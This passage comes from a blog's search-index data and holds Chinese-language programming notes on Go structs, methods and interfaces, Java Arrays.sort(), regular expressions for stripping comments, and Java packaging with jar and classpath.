c.Int(&quot;port&quot;) == 8000 { return cli.NewExitError(&quot;invalid port&quot;, 88) } return nil } app.Before = func(c *cli.Context) error { fmt.Println(&quot;app Before&quot;) return nil } app.After = func(c *cli.Context) error { fmt.Println(&quot;app After&quot;) return nil } sort.Sort(cli.FlagsByName(app.Flags)) cli.HelpFlag = cli.BoolFlag{ Name: &quot;help, h&quot;, Usage: &quot;Help!Help!&quot;, } cli.VersionFlag = cli.BoolFlag{ Name: &quot;print-version, v&quot;, Usage: &quot;print version&quot;, } err := app.Run(os.Args) if err != nil { log.Fatal(err) }}","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Golang/Go%E8%AF%AD%E8%A8%80%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%BA%93urfave-cli%E7%AE%80%E4%BB%8B/"},{"title":"Go语言结构类型详解","text":"Go允许用户自定义类型，当你需要用代码抽象描述一个事物或者对象的时候，可以声明一个 struct 类型来进行描述。 当然，Go语言中，用户还可以基于已有的类型来定义其他类型。 简单来说，Go语言中用户可以有两种方法定义类型，第一种是使用 struct 关键字来创造一个结构类型；第二种是基于已有的类型，将其作为新类型的类型说明。 01. 自定义类型的基本使用基于已有的类型的这种方式比较简单，但需要注意的是，虽然是基于已有类型来定义新类型，但是基础类型和新类型是完全不同的两种类型，不能相互赋值，因为Go语言中，编译器不会对不同类型的值做隐式转换。 当需要使用一个比较明确的名字类描述一种类型时，使用这种自定义类型就比较合适，比如定义一个表示年龄的类型可以基于整形来定义一个 Age 类型，特指年龄类型。 下面是基于已有类型的方式定义类型的示例 12345678910// 基于 int64 声明一个 Duration 类型// int 是 Duration 的基本类型// 但是他们是两个完全不同的类型，在Go中是不能相互赋值的type Duration int// 声明一个 Duration 类型的变量 dvar d Duration// 声明并初始化int类型的变量i 为 50i := 50// 尝试赋值会报错d = i // Cannot use 'i' (type int) as type Duration 使用关键字 struct 来声明一个结构类型时，要求字段是固定并且唯一的，并且字段的类型也是已知的，但是字段类型可以是内置类型（比如 string, bool, int 等等），也可以是用户自定义的类型（比如，本文中介绍的 struct 类型）。 声明struct 结构体的公式：type 结构体名称 struct {} 。 在任何时候，创建一个变量并初始化其零值时，我们习惯是使用关键字 var，这种用法是为了更明确的表示变量被设置为零值。 而如果是变量被初始化为非零值时，则使用短变量操作符 := 和结构字面量 结构类型{ 字段: 字段值, } 或者 结构类型{ 字段1值, 字段2值 } 来创建变量。 两种字面量初始化方式的差异与限制： 结构类型{ 字段1值, 字段2值 } 这种初始化方式时： 在最后一个字段值的结尾可以不用加逗号 , 必须严格按照声明时的字段顺序来进行初始化，不然会得不到预期的结果；如果字段类型不一致，还会导致初始化失败 必须要初始化所有的字段，不然会报错 Too few values 结构类型{ 字段: 字段值, } 这种初始化方式时： 每一个字段值的结尾必须要加一个逗号 , 初始化时，不要考虑字段声明的顺序 允许只初始化部分字段 123456789101112131415161718192021222324252627282930313233343536 package main import &quot;log&quot; // 声明无状态的空结构体 animal type animal struct {} // 声明一个结构体 cat // 内部有有 name, age 两个字段 // 字段 name 类型为 string类型 // 字段 age 类型为 int 类型 type cat struct { name string age int } func main() { // 初始化1 var c1 cat log.Println(c1) // { 0}​ // 初始化2 // c2 := cat{&quot;kitten&quot;} // 报错：Too few values c2 := cat{&quot;kitten&quot;, 1} log.Println(c2) // {kitten 1}​ // 初始化3 c3 := cat{age: 2} log.Println(c3, c3.age) // { 2} 2 // 变量字段赋值 c3.name = &quot;kk&quot;​ // 字段访问 // 变量.字段名称 log.Println(c3.name) // kk} 以上是 struct 结构类型的基本使用，但是在项目开发中会遇到其他的用法，比如解析 json 或者 xml 文件到结构体类型变量中。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// 解析 json 的示例// 数据文件// data.json[ { &quot;site&quot; : &quot;npr&quot;, &quot;link&quot; : &quot;http://www.npr.org/rss/rss.php?id=1001&quot;, &quot;type&quot; : &quot;rss&quot; }, { &quot;site&quot; : &quot;npr&quot;, &quot;link&quot; : &quot;http://www.npr.org/rss/rss.php?id=1008&quot;, &quot;type&quot; : &quot;rss&quot; }, { &quot;site&quot; : &quot;npr&quot;, &quot;link&quot; : &quot;http://www.npr.org/rss/rss.php?id=1006&quot;, &quot;type&quot; : &quot;rss&quot; }]​// main.gopackage main​import ( &quot;encoding/json&quot; &quot;log&quot; &quot;os&quot;)​type Feed struct { Site string `json:&quot;site&quot;` Link string `json:&quot;link&quot;` Type string `json:&quot;type&quot;`}​// 解析 JSON 数据func ParseJSON(path string) ([]*Feed, error) { file, err := os.Open(path) if err != nil { return nil, err }​ // 注意：打开文件之后，记得要关闭文件 defer file.Close()​ // 注意：文件读取后，需要结构体来解析json数据 var files []*Feed json.NewDecoder(file).Decode(&amp;files) return files, nil}​func main() { // 读取并解析 json 数据 var path = &quot;./data.json&quot; feeds, err := ParseJSON(path) if err != nil { log.Println(&quot;error: &quot;, err) } for i, val := range feeds { log.Printf(&quot;%d - site:%s, link:%s, type:%s&quot;, i, val.Site, val.Link, val.Type) }} 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667// 解析 xml 数据到结构体中示例// data.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;content&gt; &lt;item&gt; &lt;site&gt;npr&lt;/site&gt; &lt;link&gt;http://www.npr.org/rss/rss.php?id=1001&lt;/link&gt; &lt;type&gt;rss&lt;/type&gt; &lt;/item&gt; &lt;item&gt; &lt;site&gt;npr&lt;/site&gt; &lt;link&gt;http://www.npr.org/rss/rss.php?id=1002&lt;/link&gt; &lt;type&gt;rss&lt;/type&gt; &lt;/item&gt; &lt;item&gt; &lt;site&gt;npr&lt;/site&gt; &lt;link&gt;http://www.npr.org/rss/rss.php?id=1003&lt;/link&gt; &lt;type&gt;rss&lt;/type&gt; &lt;/item&gt;&lt;/content&gt;​// main.gopackage main​import ( &quot;encoding/xml&quot; &quot;io/ioutil&quot; &quot;log&quot; &quot;os&quot;)​type Content struct { XMLName xml.Name `xml:&quot;content&quot;` // 指定xml中的名称 Item []item `xml:&quot;item&quot;`}type item struct { XMLName xml.Name `xml:&quot;item&quot;` // 指定xml中的名称 Site string `xml:&quot;site&quot;` Link string `xml:&quot;link&quot;` Type string `xml:&quot;type&quot;`}​// 解析 XML 数据func ParseXML(path string) (*Content, error) { // 读取 xml data, err := ioutil.ReadFile(path) if err != nil { return nil, err }​ var con Content // 解析 xml xml.Unmarshal(data, &amp;con) return &amp;con, nil}​func main() { // 读取并解析 xml 数据 var xmlpath = &quot;./data.xml&quot; content, err := ParseXML(xmlpath) if err != nil { log.Println(&quot;error: &quot;, err) } for i, val := range content.Item { log.Printf(&quot;%d - site:%s, link:%s, type:%s&quot;, i, val.Site, val.Link, val.Type) }} 02. 公开或未公开的标识符在Go语言中，声明类型、函数、方法、变量等标识符时，使用大小写字母开头来区分该标识符是否公开（即是否能在包外访问）。 大写字母开头表示公开，小写字母开头表示非公开。所以如果某个结构类型以及结构类型的字段，函数，方法，变量等标识符，想要被外部访问到，那必须以大写字母开头。 12345678910111213141516171819202122232425262728293031323334353637383940// user 包package user​// 基于 int 类型声明一个 duration 类型// 未公开的类型（以小写字母开头）// 包外部，不能直接访问type duration int​// 公开的类型（以大写字母开头）// 包外部能直接访问type Duration int​// 未公开的结构类型 usertype user struct { name string}​// 公开的结构类型 Usertype User struct { Name string phone string address}​// 未公开的 address 类型// 包含公开的字段 Citytype address struct { City string position position}​type position struct { Longitude string Latitude string}​// 通过工厂函数，返回未公开的变量类型func New(num int) duration { return duration(num)} 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// main 包package main​import ( &quot;go-demo/user&quot; &quot;log&quot;)​func main() { // ------​ // 在 main 包中，试图使用 user 包中的为公开的 duration 类型 //var d1 user.duration = 10 // 报错：Unexported type 'duration' usage​ // ------​ // 在 main 包中，访问一个 user 包中公开的 Duration 类型 var d2 user.Duration = 10 log.Println(d2) // 结果：10​ // ------​ // 还可以以工厂函数的方式使用，user 包中未公开的类型 d3 := user.New(100) log.Printf(&quot;type: %T, value:%d&quot;, d3, d3) // 结果：type: user.duration, value:100​ // ------​ // main包中尝试访问 user 包中未公开的结构类型 user //var u user.user // 报错：Unexported type 'user' usage​ // ------​ // main包中尝试访问 user 包中公开的结构类型 User var u user.User log.Printf(&quot;%#v&quot;, u) // 结果：user.User{name:&quot;&quot;}​ // 访问公开 User 类型的未公开的字段 phone //log.Println(u.phone) // 报错：Unexported field 'phone' usage​ // 初始化未公开的字段 phone //u2 := user.User{phone: &quot;176888888888&quot;} // 报错：Unexported field 'phone' usage in struct literal​ // 访问公开 User 类型的公开的字段 Name // 给字段赋值 //u.Name = &quot;Jack&quot; //log.Println(u.Name) // 结果：Jack​ // 初始化公开字段 u3 := user.User{ Name: &quot;Jack&quot;, } log.Println(u3.Name) // 结果：Jack​ // ------​ // main 包中初始化 user 包中公开的 User 类型中嵌套的未公开的 address 类型 // 报错：Unexported field 'address' usage in struct literal //u4 := user.User{ // address: address{ // City: &quot;Beijing&quot;, // }, //}​​ var u5 user.User // 嵌套的结构类型会提升到上级结构中 u5.City = &quot;Beijing&quot; log.Println(u5.City) // Beijing​ // 尝试访问子孙级别的嵌套结构的公开的字段 // 无法访问 //u5.Longitude = &quot;xx&quot; //报错：u5.Longitude undefined (type user.User has no field or method Longitude)} 03. 给自定义类型增加方法在Go语言中，编译器只允许为命名的用户定义的类型声明方法。方法跟函数类似，只是方法不会单独存在，一般是绑定到某个结构类型中，给类型增加方法的方式很简单，就是在方法名和 func 之间增加一个参数即可, 这个参数称为方法的接收者。 12345678910111213141516type User struct { Name string}​// 给 User 类型增加方法 Readfunc (u User) Read() { log.Println(u.Name, &quot;is Reading...&quot;)}​// User 类型变量使用 Read 方法func main() { u := User{ Name: &quot;Jack&quot;, } u.Read() // 结果 Jack is Reading...} 方法的接收者，可以是值接收者，也可以是指针接收者。 而应该使用值接收者还是指针接收者，那要看给这个类型增加或删除某个值时，是创建一个新值，还是要更改当前值？如果是要创建一个新值，该类型的方法就使用值接收者；如果是要修改当前值，就使用指针接收者。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110package main​import &quot;log&quot;​// 基于基本类型创建类型type Age int​// 值接收者func (age Age) ChangeAge() { age = 18}// 指针接收者func (age *Age) ChangeAgeByPointer() { *age = 18}​// 基于引用类型创建类型type IP []byte​// 值接收者func (ip IP) ChangeIP() { ip = []byte(&quot;456&quot;)}​// 指针接收者func (ip *IP) ChangeIPByPointer() { *ip = []byte(&quot;456&quot;)}​type Pet struct { Name string Hobby []string}​// 值接收者func (pet Pet) ChangePetValue(name string, hobby []string) { pet.Name = name pet.Hobby = hobby}​// 指针接收者func (pet *Pet) ChangePetValueByPointer(name string, hobby []string) { pet.Name = name pet.Hobby = hobby}​func main() { // -----基于基本类型来定义类型的示例----- // 值接收者，不会改变原来的值 var age Age = 38 log.Println(&quot;前age=&quot;, age) // 前age= 38 // 值调用方法 age.ChangeAge() // 指针调用方法 //(&amp;age).ChangeAge()​ log.Println(&quot;后age=&quot;, age) // 后age= 38​ // 指针接收者，会改变原来的值 var age2 Age = 38 log.Println(&quot;前age2=&quot;, age2) // 前age= 38 // 值调用方法 age2.ChangeAgeByPointer() // 指针调用方法 //(&amp;age2).ChangeAgeByPointer()​ log.Println(&quot;后age2=&quot;, age2) // 后age= 18​​ // -----基于引用类型来定义类型的示例----- // 值接收者，不会改变原来的值 var ip IP = []byte(&quot;123&quot;) log.Printf(&quot;前ip=%s&quot;, ip) // 前ip=123 // 值调用方法 ip.ChangeIP() // 指针调用方法 //(&amp;ip).ChangeIP() log.Printf(&quot;后ip=%s&quot;, ip) // 后ip=123​ // 指针接收者，会改变原来的值 var ip2 IP = []byte(&quot;123&quot;) log.Printf(&quot;前ip2=%s&quot;, ip2) // 前ip2=123 // 值调用方法 ip2.ChangeIPByPointer() // 指针调用方法 //(&amp;ip2).ChangeIPByPointer() log.Printf(&quot;后ip2=%s&quot;, ip2) // 后ip2=456​​ // ----- struct 类型 ----- // 值接收者，不会改变原来的值 cat := Pet{ Name: &quot;kk&quot;, Hobby: []string{&quot;cookies&quot;, &quot;fishes&quot;}, } log.Printf(&quot;前：%#v&quot;, cat) // 前：method.Pet{Name:&quot;kk&quot;, Hobby:[]string{&quot;cookies&quot;, &quot;fishes&quot;}} // 值调用方法 cat.ChangePetValue(&quot;kitten&quot;, []string{&quot;meat&quot;}) // 指针调用方法 //(&amp;cat).ChangePetValue(&quot;kitten&quot;, []string{&quot;meat&quot;}) log.Printf(&quot;后：%#v&quot;, cat) // 后：method.Pet{Name:&quot;kk&quot;, Hobby:[]string{&quot;cookies&quot;, &quot;fishes&quot;}}​ // 指针接收者，会改变原来的值 log.Printf(&quot;指针前：%#v&quot;, cat) // 指针前：method.Pet{Name:&quot;kk&quot;, Hobby:[]string{&quot;cookies&quot;, &quot;fishes&quot;}} // 值调用方法 cat.ChangePetValueByPointer(&quot;kitten&quot;, []string{&quot;meat&quot;}) // 指针调用方法 //(&amp;cat).ChangePetValueByPointer(&quot;kitten&quot;, []string{&quot;meat&quot;}) log.Printf(&quot;指针后：%#v&quot;, cat) // 指针后：method.Pet{Name:&quot;kitten&quot;, Hobby:[]string{&quot;meat&quot;}}} 04. 嵌入类型Go语言通过类型嵌套的方式来复用代码，当多个结构类型相互嵌套时，外部类型会复用内部类型的代码。 由于内部类型的标识符会提升到外部类型中，所以内部类型实现的字段，方法和接口在外部类型中也能直接访问到。 当外部类型需要实现一个和内部类型一样的方法或接口时，只需要给外部类型重新绑定方法或实现接口即可。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384package main​import &quot;log&quot;​// user 类型type user struct { name string phone string}​// 给 user 实现 Call 方法func (u *user) Call() { log.Printf(&quot;Call user %s&lt;%s&gt;&quot;, u.name, u.phone)}​// Admin 类型 （外部类型）// 嵌套 user （内部类型）type Admin struct { user level string}​// 重新实现 Admin 类型的 Call 方法func (ad *Admin) Call() { log.Printf(&quot;Call admin %s&lt;%s&gt;&quot;, ad.name, ad.phone)}​// 定义一个接口 notifier,// 接口需要实现一个 notify 方法type notifier interface { notify()}​// 给 user 实现 notify 方法func (u *user) notify() { log.Printf(&quot;Sending a message to user %s&lt;%s&gt;&quot;, u.name, u.phone)}​// 定义一个函数 sendNotification// 函数接收一个实现了 notifier 接口的值// 然后调用参数的 notify 方法func sendNotification(n notifier) { n.notify()}​// 给 Admin 实现 notify 方法func (ad *Admin) notify() { log.Printf(&quot;Sending a message to ADMIN %s&lt;%s&gt;&quot;, ad.name, ad.phone)}​func main() { // 声明并初始化 Admin 类型的变量 ad ad := Admin{ user: user{ name: &quot;Jack&quot;, phone: &quot;17688888888&quot;, }, level: &quot;super&quot;, } // ad 调用 user 内部的 Call 方法 ad.user.Call() // Call user Jack&lt;17688888888&gt;​ // 由于内部类型的标识符提升，所以外部类型值 ad 也可以直接调用其内部类型的标识符(字段，方法，接口等) ad.Call() // Call user Jack&lt;17688888888&gt; log.Println(ad.name, ad.phone) // Jack 17688888888​ // ad 重新实现一个和内部类型 user 一样的 Call 方法 // 覆盖内部类型 user 提升的 Call 方法 ad.Call() // Call admin Jack&lt;17688888888&gt;​ // user 内部的 Call 方法没有变化 ad.user.Call() // Call user Jack&lt;17688888888&gt;​​ // 外部类型和内部类型调用接口方法 sendNotification(&amp;ad) // Sending a message to user Jack&lt;17688888888&gt; ad.notify() // Sending a message to user Jack&lt;17688888888&gt; ad.user.notify() // Sending a message to user Jack&lt;17688888888&gt;​ // 外部类型重新实现接口方法后 sendNotification(&amp;ad) // Sending a message to ADMIN Jack&lt;17688888888&gt; ad.notify() // Sending a message to ADMIN Jack&lt;17688888888&gt; ad.user.notify() // Sending a message to user Jack&lt;17688888888&gt;} **05.**类型实现接口Go语言中，接口是用来定义行为的类型，这些被定义的行为不由接口直接实现，而是通过方法由用户定义的类型实现。 如果用户定义的类型实现了某个接口里的一组方法，那么用户定义的这个类型值，就可以赋值给该接口值，此时用户定义的类型称为实体类型。 而用户定义的类型想要实现一个接口，需要遵循一些规则，这些规则使用方法集来进行定义。 从类型实现方法的接收者角度来看，可以描述为以下表格。 方法接收者 类型值或类型值的指针 (t T) T and *T (t *T) *T 表示当类型的方法为指针接收者时，只有类型值的指针，才能实现接口。 如果类型的方法为值接收者，那么类型值还是类型值的指针都能够实现对应的接口。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package mainimport &quot;log&quot;// 定义一个接口 notifier// 要实现 notifier 接口必须实现 notify 方法type notifier interface { notify()}type user struct { name string phone string}// 指针接收者func (u *user) notify() { log.Println(&quot;Send user a text&quot;)}type Admin struct { user level string}// 值接收者func (ad Admin) notify() { log.Println(&quot;Send admin a message&quot;)}// 多态函数func sendNotification(n notifier) { n.notify()}func main() { // ---指针接收者方法的类型实现接口示例--- u := user{ name: &quot;Jack&quot;, phone: &quot;17688888888&quot;, } // 尝试将类型值实现接口 notifier // 因为类型的方法是指针接收者 // 使用类型值实现接口时，会编译不通过 //var n notifier = u // Cannot use 'u' (type user) as type notifier Type does not implement 'notifier' as 'notify' method has a pointer receiver // 使用类型值得指针，可以正常实现接口 var n notifier = &amp;u n.notify() // Send user a text // ---值接收者方法的类型实现接口示例--- // 实现值接收者方法的类型实现接口 ad := Admin{ user: user{&quot;Jack&quot;, &quot;17688888888&quot;}, level: &quot;super&quot;, } // 使用类型值实现接口，成功 var n2 notifier = ad n2.notify() // Send admin a message // 使用类型值的指针实现接口, 成功 var n3 notifier = &amp;ad n3.notify() // Send admin a message // -------多态示例-------- // 接口值多态 // 因为 Admin 和 user 两个类型都实现了接口 // 而 sendNotification 函数接收一个 notifier 接口值 // 然后调用接口值对应的 notify 方法 // 从而实现了接口值的多态 sendNotification(n) // Send user a text sendNotification(n3) // Send admin a message}","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Golang/Go%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84%E7%B1%BB%E5%9E%8B%E8%AF%A6%E8%A7%A3/"},{"title":"Java Arrays.sort()详解","text":"一、介绍Arrays.sort()是经过调优排序算法，性能能达到n*log(n)。Arrays.sort()重载了四类方法 sort(T[] a)：对指定T型数组按数字升序排序。 sort(T[] a,int formIndex, int toIndex)：对指定T型数组的指定范围按数字升序排序。 sort(T[] a, Comparator&lt;? supre T&gt; c): 根据指定比较器产生的顺序对指定对象数组进行排序。 sort(T[] a, int formIndex, int toIndex, Comparator&lt;? supre T&gt; c): 根据指定比较器产生的顺序对指定对象数组的指定对象数组进行排序。 1、sort(T[] a)对指定T型数组按数字升序排序。 12345678910111213import java.util.Arrays;import java.util.Comparator;public class ArraysSort { public static void main(String[] args) { int[] a={2,5,4,3,1,8}; Arrays.sort(a); System.out.println(Arrays.toString(a)); }} // 结果 // [1, 2, 3, 4, 5, 8] 2、sort(T[] a,int formIndex, int toIndex)对指定T型数组的指定范围按数字升序排序。 12345678910111213import java.util.Arrays;import java.util.Comparator;public class ArraysSort { public static void main(String[] args) { int[] a={2,5,4,3,1,8}; Arrays.sort(a,2,5); System.out.println(Arrays.toString(a)); }}// 结果// [2, 5, 1, 3, 4, 8] 3、sort(T[] a, Comparator&lt;? supre T&gt; c)根据指定比较器产生的顺序对指定对象数组进行排序。 （1）按第一维元素比较二维数组123456789101112131415161718192021222324252627282930313233343536373839import java.util.Arrays;import java.util.Comparator;public class ArraysSort { public static void main(String[] args) { int[][] nums=new int[][]{{1,3},{1,2},{4,5},{3,7}}; //方法一 Arrays.sort(nums,new Comparator&lt;int[]&gt;(){ @Override public int compare(int[] a,int[] b){ if(a[0]==b[0]){ return a[1]-b[1]; }else{ return a[0]-b[0]; } } }); // 方法二，使用匿名表达式 // (a,b)-&gt;a[1]-b[1]会自动转变成上面的形式 /*Arrays.sort(nums,(a,b)-&gt;a[1]-b[1]);*/ for (int[] num : nums) { System.out.println(Arrays.toString(num)); } int[] a={2,5,4,3,1,8}; Arrays.sort(a,2,5); System.out.println(Arrays.toString(a)); }}// 结果/*[1, 2][1, 3][3, 7][4, 5]*/ （2）按第二维元素比较二维数组123456789101112131415161718192021222324252627282930313233import java.util.Arrays;import java.util.Comparator;public class ArraysSort { public static void main(String[] args) { int[][] nums=new int[][]{{1,3},{1,2},{4,5},{3,7}}; //方法一 Arrays.sort(nums,new Comparator&lt;int[]&gt;(){ @Override public int compare(int[] a,int[] b){ if(a[1]==b[1]){ return a[0]-b[0]; }else{ return a[1]-b[1]; } } }); //方法二 /*Arrays.sort(nums,(a,b)-&gt;a[1]-b[1]);*/ for (int[] num : nums) { System.out.println(Arrays.toString(num)); } }}// 结果/*[1, 2][1, 3][4, 5][3, 7]*/ 其实这个方法最重要的还是类对象的比较。由于我们可以自定义比较器，所以我们可以使用策略模式，使得在运行时选择不同的算法。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859import java.util.Arrays;import java.util.Comparator;class Dog{ int size; int weight; public Dog(int s, int w){ size = s; weight = w; }}class DogSizeComparator implements Comparator&lt;Dog&gt;{ @Override public int compare(Dog o1, Dog o2) { return o1.size - o2.size; }}class DogWeightComparator implements Comparator&lt;Dog&gt;{ @Override public int compare(Dog o1, Dog o2) { return o1.weight - o2.weight; }}public class ArraysSort { public static void main(String[] args) { Dog d1 = new Dog(2, 50); Dog d2 = new Dog(1, 30); Dog d3 = new Dog(3, 40); Dog[] dogArray = {d1, d2, d3}; printDogs(dogArray); Arrays.sort(dogArray, new DogSizeComparator()); printDogs(dogArray); Arrays.sort(dogArray, new DogWeightComparator()); printDogs(dogArray); } public static void printDogs(Dog[] dogs){ for(Dog d: dogs) System.out.print(&quot;size=&quot;+d.size + &quot; weight=&quot; + d.weight + &quot; &quot;); System.out.println(); }}// 结果/*size=2 weight=50 size=1 weight=30 size=3 weight=40 size=1 weight=30 size=2 weight=50 size=3 weight=40 size=1 weight=30 size=3 weight=40 size=2 weight=50 */ 那么在参数中会出现super呢？这意味着这类型可以是T或者它的父类型。这就使得该方法可以允许所有子类使用相同的比较器。详细见代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566import java.util.Arrays;import java.util.Comparator;class Animal{ int size;}class Dog extends Animal{ public Dog(int s){ size = s; }}class Cat extends Animal{ public Cat(int s){ size = s; }}class AnimalSizeComparator implements Comparator&lt;Animal&gt;{ @Override public int compare(Animal o1, Animal o2) { return o1.size - o2.size; }}public class ArraysSort { public static void main(String[] args) { Dog d1 = new Dog(2); Dog d2 = new Dog(1); Dog d3 = new Dog(3); Dog[] dogArray = {d1, d2, d3}; printDogs(dogArray); Arrays.sort(dogArray, new AnimalSizeComparator()); printDogs(dogArray); System.out.println(); Cat c1 = new Cat(2); Cat c2 = new Cat(1); Cat c3 = new Cat(3); Cat[] catArray = {c1, c2, c3}; printDogs(catArray); Arrays.sort(catArray, new AnimalSizeComparator()); printDogs(catArray); } public static void printDogs(Animal[] animals){ for(Animal a: animals) System.out.print(&quot;size=&quot;+a.size + &quot; &quot;); System.out.println(); }}// 结果/*size=2 size=1 size=3 size=1 size=2 size=3 size=2 size=1 size=3 size=1 size=2 size=3 */ 4、sort(T[] a, int formIndex, int toIndex, Comparator&lt;? supre T&gt; c)根据指定比较器产生的顺序对指定对象数组的指定对象数组进行排序。 12345678910111213141516171819202122232425262728import java.util.Arrays;import java.util.Comparator;public class ArraysSort { public static void main(String[] args) { int[][] nums=new int[][]{{1,3},{1,2},{4,5},{3,7}}; Arrays.sort(nums,2,4,new Comparator&lt;int[]&gt;(){ @Override public int compare(int[] a,int[] b){ if(a[0]==b[0]){ return a[1]-b[1]; }else{ return a[0]-b[0]; } } }); }}// 结果/*[1, 3][1, 2][3, 7][4, 5]可以看到只对第三行和第四行排序了*/","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%20Arrays.sort()%E8%AF%A6%E8%A7%A3/"},{"title":"Java 分割出字符串中的字母或数字","text":"123String name = &quot;test001&quot;;String zm = name.replaceAll(&quot;[^(a-zA-Z)]&quot;,&quot;&quot; ); // 取出字母String number = name.replaceAll(&quot;[^(0-9)]&quot;, &quot;&quot;) // 取出数字","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%20%E5%88%86%E5%89%B2%E5%87%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84%E5%AD%97%E6%AF%8D%E6%88%96%E6%95%B0%E5%AD%97/"},{"title":"Java 匹配注释的正则表达式","text":"参考http://iregex.org/blog/uncomment-program-with-regex.html 通用注释有两种: // /*......*/ 通常情况下，行级注释可以这样匹配 1\\/\\/[^\\n]* 块级别这样 1\\/\\*([^\\*^\\/]*|[\\*^\\/*]*|[^\\**\\/]*)*\\*\\/ 或者还可以这样 1\\/\\*(\\s|.)*?\\*\\/ 不过在特殊情况中，行级别会跟协议前缀冲突，所以还需要特殊处理 1(?&lt;!http:)\\/\\/.* 甚至于不限定于http协议 1(?&lt;!:)\\/\\/.* 最终处理注释为： 1234567/*** 处理注释 groovy代码 * @param text * @return ***/ def removeComment(text) { return text.replaceAll(&quot;(?&lt;!:)\\\\/\\\\/.*|\\\\/\\\\*(\\\\s|.)*?\\\\*\\\\/&quot;, &quot;&quot;) }","link":"/2022/11/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%20%E5%8C%B9%E9%85%8D%E6%B3%A8%E9%87%8A%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"},{"title":"Java包","text":"包的声明在源文件最开始作包声明： 123package com.test.testpackage... 也可以不提供包声明，这就是使用默认包。通常不推荐。 源文件的路径必须匹配包名称，比如上面的源文件需要被存储在com/test/testpackage下。随后，在包的根目录下使用javac [完整目录]/文件名.java编译源代码，生成的.class文件会被放置在源代码的同级目录中。 运行程序需要使用完整包名+类名。 使用javac xxx -d xxx可以将class文件放在独立目录，不会扰乱源码目录，且class文件也会有正确的目录结构 类路径1jar cvf library.jar com/test/testapp/*.class 这样可以将类库打包，便于其他人使用。jar也可以用来打包程序 1jar cvfe program.jar com.test.testapp.MainClass com/test/testapp/*.class* 然后这样运行程序： 1java -jar program.jar 使用类库的jar文件时，需要指定class path告诉编译器和虚拟机这些jar文件在哪里。class path可以包含： 包含class文件的目录 jar文件 包含jar文件的目录 javac和jar都有-classpath（简写为-cp）选项。例如： 1java -cp .:../libs/lib1.jar:../libs/lib2.jar com.test.MainClass 在Windows中，需要把上面的冒号换为分号。也可以使用通配符包含所有文件： 1java -cp .:../libs/\\* com.test.MainClass 可以添加manifest文件，来防止其他代码被加入到包中 12345//filename: manifest.txtName: com/myapp/util/Sealed: trueName: com/myapp/misc/Sealed: true 然后使用下面的jar命令添加manifest： 1jar cvfm library.jar manifest.txt com/myapp/*/*.class","link":"/2023/02/26/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/Java%E5%8C%85/"},{"title":"Java学习笔记：基础篇","text":"序言说起来，自从学完了C语言，很久都没有成系统地学完一门编程语言了。 Python和PHP比较简单，基本都是边用边查学完的；Kotlin则是最近学Android开发顺便学的；C++倒是系统看过一遍书，不过最近基本没咋写过，忘的也差不多了；C#好久之前学的了，也就是写UWP的时候学了一点；JS？好像会，又好像不会（ 快寒假了，也该摸点鱼了。梳理一下：Android学了大半，ML/DL没碰，Unity还在新建文件夹，算法就看了一点点。仔细想了想，还是先学点Java吧，一来下学期要学，二来和Android开发联系也紧密。最重要的是，这次得认真学学面向对象了。虽然在Python和PHP里都在用，但是终归还是系统学习一遍为上。 我用的是《Java核心技术》卷一/二。很多人在推荐，试读了一下，感觉不错，不像黑皮系列那么难读，废话也比较少。 Java简介官方白皮书给出了如下关键字：简单性（接近C++）、面向对象（支持多重继承）、分布式、健壮性（优秀的指针模型）、安全性（复杂的安全模型）、体系结构中立（Java虚拟机）、可移植性（众多平台独立的Java库）、解释型（轻量的编译过程）、高性能（即时编译器）、多线程、动态性。 虽然关键字里有“解释型”，然而Java是真正的编译型语言。 虽然说Java是纯粹的面向对象语言，不过它并没有做到完全的面向对象：int，double等基本数据类型仍然不是对象。不过同样基于JVM（Java虚拟机）的Kotlin做到了完全的面向对象。 Java环境配置 在Windows下，访问Oracle官网，下载JDK（Java Development Kit）后安装，并将jdk/bin/目录加入环境变量（详情百度）即可。 Linux使用相应的包管理器（apt，yum等）直接安装即可。 安装完成后，可以安装库源文件：找到jdk/lib目录，将src.zip解压到jdk/javasrc/目录下即可。同时也可下载官方文档，在官网上能找到。 JDK基本使用打开记事本（或其他文本编辑器），写入以下内容： 1234567891011public class Hello{ public static void main(String[] args) { String greeting = &quot;Hello, world!&quot;; System.out.println(greeting); for(int i=0;i&lt;greeting.length();i++) System.out.print(&quot;=&quot;); System.out.println(); }} 